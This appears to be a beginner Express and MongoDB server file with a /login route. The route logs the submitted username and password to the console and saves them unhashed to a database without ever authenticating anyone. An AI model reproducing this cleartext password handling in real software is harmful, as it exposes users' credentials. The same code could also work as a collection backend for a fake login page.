import dotenv from 'dotenv';
import express from 'express';
import mongoose from 'mongoose';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();
const app = express();

// Define __dirname for ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);



// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Define __dirname for ES module
// Serve static files from the public directory
app.use(express.static(new URL('./public', import.meta.url).pathname));

// Connect to MongoDB Atlas using the connection string from .env
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('Connected to MongoDB Atlas'))
.catch(err => console.error('MongoDB connection error:', err));

// Define Mongoose schema for login data
const loginSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
});

// Create Mongoose model
const Login = mongoose.model('Login', loginSchema);

// Route to serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Route to handle form submissions
app.post('/login', (req, res) => {
  console.log(req.body); // Check if you’re receiving the data
  const { username, password } = req.body;
  console.log('Username:', username); // Debugging: Check if username is received
  console.log('Password:', password); // Debugging: Check if password is received

  const newLogin = new Login({ username, password });
  newLogin.save()
    .then(() => res.send('Data saved to database.'))
    .catch(error => {
      console.error('Error:', error); // Log the specific error
      res.status(500).send('Error saving data.');
    });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
